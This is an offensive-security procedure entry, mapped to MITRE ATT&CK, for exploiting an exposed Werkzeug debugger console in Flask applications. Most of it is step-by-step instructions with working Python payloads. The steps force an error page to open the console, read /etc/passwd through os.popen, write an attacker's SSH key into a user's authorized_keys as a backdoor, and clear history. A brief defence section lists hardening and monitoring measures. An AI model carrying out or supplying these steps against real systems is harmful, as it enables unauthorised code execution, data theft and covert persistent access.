---
id: 0868da57-379f-45ad-a149-b9e11fe15a4c
name: Werkzeug-Debugger-Panel-Read-Write-RCE
type: procedure
verified: true
submitted: false
created_at: '2019-10-09T23:01:08.421637+00:00'
updated_at: '2023-05-29T16:48:53.253841+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Persistence|TA0003 - Persistence]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - >-
    [[techniques/Command and Scripting Interpreter|T1059 - Command and Scripting
    Interpreter]]
  - >-
    [[techniques/Command and Scripting Interpreter/T1059.006 Python|T1059.006 -
    Python]]
sub_techniques: []
tags:
  - '[[tags/Web Applications]]'
  - rce
  - file-read
  - file-write
commands: []
platforms:
  - Linux
  - Web
tools: []
validated: true
---

# Werkzeug-Debugger-Panel-Read-Write-RCE

## Summary

This procedure exploits the Werkzeug debugger console in a Flask or similar WSGI application to achieve remote code execution (RCE) by reading and writing arbitrary files on the target system. When the debugger is enabled in production (which is not recommended), triggering an error page exposes an interactive Python console that allows file operations, enabling persistence via SSH key injection or data exfiltration through file reads.

## Description

Werkzeug is a comprehensive WSGI web application library used in Python frameworks like Flask. By default, its debugger is disabled in production environments, but if enabled via configuration (e.g., DEBUG=True in Flask), it provides an interactive console on error pages. This console executes Python code in the context of the web application process, granting file system access at the application's privilege level. Attackers can trigger errors by accessing invalid resources (e.g., out-of-bounds indices in URL parameters) to reveal the debugger. Once accessed, the console supports arbitrary Python execution, such as opening files for reading sensitive data like /etc/passwd or writing files like SSH authorized_keys for backdoor access. This technique is particularly effective against misconfigured web apps on Linux servers, leading to RCE without authentication. Detection relies on monitoring for debug-enabled responses or anomalous file modifications.

## Requirements

- Network access to the target web application (HTTP/HTTPS over port 80/443).
- The target application must use Werkzeug with the debugger enabled (e.g., Flask app.run(debug=True)).
- Knowledge of the application's URL structure to trigger errors (e.g., indexed endpoints like /articles/1).
- Attacker's SSH public key for persistence via authorized_keys injection.
- No special tools required beyond a web browser; optionally use a proxy like Burp Suite for request interception.
- Target platform: Linux-based web server (e.g., Ubuntu with Apache/Nginx + Python).

## Defense

- Disable Werkzeug debugger in production by setting DEBUG=False and using a WSGI server like Gunicorn without debug mode.
- Implement error page hardening to avoid exposing stack traces or consoles (use custom error handlers).
- Monitor web server logs for 500 errors triggered by invalid inputs and anomalous Python executions.
- Use web application firewalls (WAFs) to detect and block requests attempting to trigger debug modes.
- Regularly audit file system changes, especially in user home directories like ~/.ssh/authorized_keys.
- Enable application-level logging for Python code execution if using frameworks like Flask.

## Objectives

1. Trigger the Werkzeug debugger console via an application error to gain interactive Python execution.
2. Read arbitrary files to exfiltrate sensitive data (e.g., configuration files, user lists).
3. Write arbitrary files to establish persistence (e.g., inject SSH keys for remote access).
4. Achieve RCE leading to privilege escalation or lateral movement on the target system.

## Instructions

### Step 1: Trigger Error Page to Access Debugger Console

**Context**: Identify and access an endpoint that can generate a 500 error, exposing the Werkzeug debugger. This is necessary because the console only appears on error pages.

Navigate to a valid indexed page (e.g., http://target.com/articles/1) and modify the parameter to an out-of-range value (e.g., http://target.com/articles/1000) to trigger an IndexError or similar exception.

On the resulting error page, locate the debugger console icon (typically a terminal-like symbol in the top-right of the error frame) and click it to open the interactive Python console.

**Expected Output**: An interactive Python REPL console within the browser, running in the context of the web app process, allowing direct code execution.

### Step 2: Read Arbitrary Files Using the Debugger Console

**Context**: Use the console to execute Python code that opens and prints the contents of a target file. This step demonstrates data exfiltration, such as reading system user lists.

In the console, execute the file read code to target a sensitive file like /etc/passwd.

**Code** ([[codes/Python-Read-Arbitrary-File-Werkzeug]]):

```python
__import__('os').popen('cat /etc/passwd').read()
```

Alternatively, use the provided code snippet for direct file handling.

**Expected Output**: The full contents of the target file printed in the console output, such as user entries from /etc/passwd (e.g., root:x:0:0:root:/root:/bin/bash).

### Step 3: Prepare SSH Key for Persistence

**Context**: Before writing a backdoor, set a variable in the console with your SSH public key. This prepares the payload for file injection.

In the console, assign your SSH public key (generated via ssh-keygen) to a variable named 'pwn' or similar. Replace the example key with your own.

```python
pwn = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...your-key-here"
```

**Expected Output**: No output; the variable is set successfully. Verify by typing 'pwn' in the console to echo the key.

### Step 4: Write Arbitrary Files Using the Debugger Console

**Context**: Execute Python code to write the prepared SSH key to a target file, such as ~/.ssh/authorized_keys, enabling SSH login without passwords.

In the console, use file write operations to inject the key into the target location. Ensure the web app process has write permissions to the directory.

**Code** ([[codes/Python-Write-Arbitrary-File-Werkzeug]]):

```python
target = "/home/bob/.ssh/authorized_keys"; f = open(target, "w"); f.write(pwn); f.close()
```

**Expected Output**: No output on success; the file is overwritten with the SSH key. Verify by reading the file back in the console or attempting SSH login from your machine.

### Step 5: Verify Persistence and Clean Up

**Context**: Confirm the write succeeded and establish the backdoor. Optionally, clear console history if possible.

From your attacking machine, attempt SSH connection: ssh bob@target-ip. If successful, the exploit worked.

To check the written file, re-execute a read command on the authorized_keys path.

**Expected Output**: Successful SSH login prompt or shell access. File read confirms key injection.

If permissions deny writes, escalate by targeting writable directories or chaining with other exploits.
